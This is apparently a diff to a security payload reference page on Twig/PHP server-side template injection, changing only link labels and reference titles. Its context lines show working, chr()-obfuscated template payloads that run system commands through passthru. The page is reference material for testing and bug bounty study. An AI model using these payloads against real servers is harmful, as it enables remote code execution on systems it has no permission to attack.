@@ -44,7 +44,7 @@ The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr
 {{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
 ```
 
-Reference and explanation of payload can be found [here](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ---
 
@@ -71,7 +71,7 @@ Execute system comman (command: `id`):
 {{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
 ```
 
-Reference and explanation of payload can be found [here](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ---
 
@@ -155,7 +155,7 @@ The following payload, which harnesses the built-in `_context` variable, also ac
 {{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
 ```
 
-Reference and explanation of payload can be found [here](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
+Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).
 
 ---
 
@@ -295,5 +295,5 @@ layout template:
 
 ## References
 
-- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - YesWeHack, Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
+- [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
 - [Server Side Template Injection (SSTI) via Twig escape handler - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
